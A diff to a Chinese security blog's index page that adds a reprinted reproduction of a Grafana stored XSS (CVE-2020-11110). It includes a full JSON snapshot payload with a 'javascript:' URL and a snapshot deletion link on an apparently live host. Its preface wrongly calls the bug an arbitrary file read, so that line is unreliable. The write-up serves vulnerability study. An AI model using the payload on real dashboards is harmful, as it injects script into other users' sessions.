@@ -87,6 +87,61 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/19/CVE-2020-11110-Grafana/">
+                Grafana 存储型XSS漏洞（CVE-2020-11110）
+            </a>
+        </h2>
+    
+    <time>
+        Jan 19, 2024
+    </time>
+    <section class="content">
+        <h1><span id="grafana-存储型xss漏洞cve-2020-11110">Grafana 存储型XSS漏洞（CVE-2020-11110）</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Hi-blog/p/grafana-stored-xss-CVE-2020-11110.html">starnight_cyber</a> 并作补充</p>
+</blockquote>
+<h2><span id="preface">Preface</span></h2><blockquote>
+<p>Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。Grafana 存在未授权任意文件读取漏洞，攻击者在未经身份验证的情况下可通过该漏洞读取主机上的任意文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">CVE编号：</span><br><span class="line">    CVE-<span class="number">2020</span>-<span class="number">11110</span></span><br><span class="line">影响范围：</span><br><span class="line">    Grafana v6<span class="number">.2</span><span class="number">.5</span></span><br><span class="line">Links</span><br><span class="line">    https://ctf-writeup.revers3c.com/challenges/web/CVE-<span class="number">2020</span>-<span class="number">11110</span>/index.html</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2><span id="复现记录">复现记录</span></h2><h3><span id="测试环境部署">测试环境部署</span></h3><blockquote>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload =&gt; </span><br><span class="line">&#123;&quot;dashboard&quot;:&#123;&quot;annotations&quot;:&#123;&quot;list&quot;:[&#123;&quot;name&quot;:&quot;Annotations &amp; Alerts&quot;,&quot;enable&quot;:true,&quot;iconColor&quot;:&quot;rgba(0, 211, 255, 1)&quot;,&quot;type&quot;:&quot;dashboard&quot;,&quot;builtIn&quot;:1,&quot;hide&quot;:true&#125;]&#125;,&quot;editable&quot;:true,&quot;gnetId&quot;:null,&quot;graphTooltip&quot;:0,&quot;id&quot;:null,&quot;links&quot;:[],&quot;panels&quot;:[],&quot;schemaVersion&quot;:18,&quot;snapshot&quot;:&#123;&quot;originalUrl&quot;:&quot;javascript:alert(&#x27;Revers3c&#x27;)&quot;,&quot;timestamp&quot;:&quot;2020-03-30T01:24:44.529Z&quot;&#125;,&quot;style&quot;:&quot;dark&quot;,&quot;tags&quot;:[],&quot;templating&quot;:&#123;&quot;list&quot;:[]&#125;,&quot;time&quot;:&#123;&quot;from&quot;:null,&quot;to&quot;:&quot;2020-03-30T01:24:53.549Z&quot;,&quot;raw&quot;:&#123;&quot;from&quot;:&quot;6h&quot;,&quot;to&quot;:&quot;now&quot;&#125;&#125;,&quot;timepicker&quot;:&#123;&quot;refresh_intervals&quot;:[&quot;5s&quot;,&quot;10s&quot;,&quot;30s&quot;,&quot;1m&quot;,&quot;5m&quot;,&quot;15m&quot;,&quot;30m&quot;,&quot;1h&quot;,&quot;2h&quot;,&quot;1d&quot;],&quot;time_options&quot;:[&quot;5m&quot;,&quot;15m&quot;,&quot;1h&quot;,&quot;6h&quot;,&quot;12h&quot;,&quot;24h&quot;,&quot;2d&quot;,&quot;7d&quot;,&quot;30d&quot;]&#125;,&quot;timezone&quot;:&quot;&quot;,&quot;title&quot;:&quot;Dashboard&quot;,&quot;uid&quot;:null,&quot;version&quot;:0&#125;,&quot;name&quot;:&quot;Dashboard&quot;,&quot;expires&quot;:0&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/19/CVE-2020-11110-Grafana/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="stored-xss">Stored-XSS</span></h3><blockquote>
+<p>替换 url 中的 localhost，访问快照地址，点击链接🔗图标。 Stored-XSS。</p>
+<p><img src="/2024/01/19/CVE-2020-11110-Grafana/2.png" alt="image"></p>
+</blockquote>
+<h3><span id="snapshot-快照删除">snapshot 快照删除</span></h3><blockquote>
+<p>访问 deleteUrl：</p>
+<p><a target="_blank" rel="noopener" href="http://103.210.162.186:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ">http://103.210.xx.xx:3000/api/snapshots-delete/o3ITlrkiwgJexFmCJxr4gsNZ8QDcc0eQ</a></p>
+<p><img src="/2024/01/19/CVE-2020-11110-Grafana/3.png" alt="image"></p>
+<p>可以删除 snapshot，这里算是个严重程度更高的漏洞。</p>
+</blockquote>
+<h2><span id="修复方案">修复方案</span></h2><blockquote>
+<p>版本升级。</p>
+</blockquote>
+<h2><span id="refer">Refer</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html">https://ctf-writeup.revers3c.com/challenges/web/CVE-2020-11110/index.html</a></p>
+<p>以上！</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Grafana/" rel="tag">Grafana</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/XSS/" rel="tag">XSS</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
             <a href="/2024/01/19/CVE-2018-15473-OpenSSH/">
                 OpenSSH用户名枚举及其检测方法（CVE-2018-15473）
             </a>
